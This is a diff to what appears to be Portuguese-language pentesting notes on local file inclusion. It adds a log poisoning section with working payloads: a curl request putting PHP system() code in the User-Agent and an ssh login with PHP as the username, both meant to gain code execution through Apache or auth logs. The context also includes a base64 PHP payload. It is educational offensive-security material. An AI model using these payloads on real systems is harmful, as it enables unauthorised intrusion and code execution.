@@ -62,3 +62,24 @@ PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
 ```
 
 <figure><img src="../.gitbook/assets/lfi-4.png" alt=""><figcaption></figcaption></figure>
+
+https://medium.com/@zoningxtr/mastering-php-wrappers-concepts-use-cases-and-security-risks-380bb59cb6c1
+
+## Log Poisoning
+
+Podemos utilizar uma técnica chamada Log poisoning para conseguir um RCE através dos logs infectados que serão lidos pelo LFI.
+
+Podemos tentar infectar o log do apache, enviando um código php para a página interpretar esse código e ser executado.
+
+```
+$ curl <target> -H "User-Agent: <?php system('ls');?>"
+```
+
+Depois, verificamos no arquivo de log, que fica em `/var/log/apache2/access.log` (baseadas em debian e ubuntu).
+
+Podemos também infectar o log do ssh, enviando dessa forma e depois lendo o arquivo `/var/log/auth.log`.
+
+```
+$ ssh -l '<?php system("id");?>' <target>
+```
+
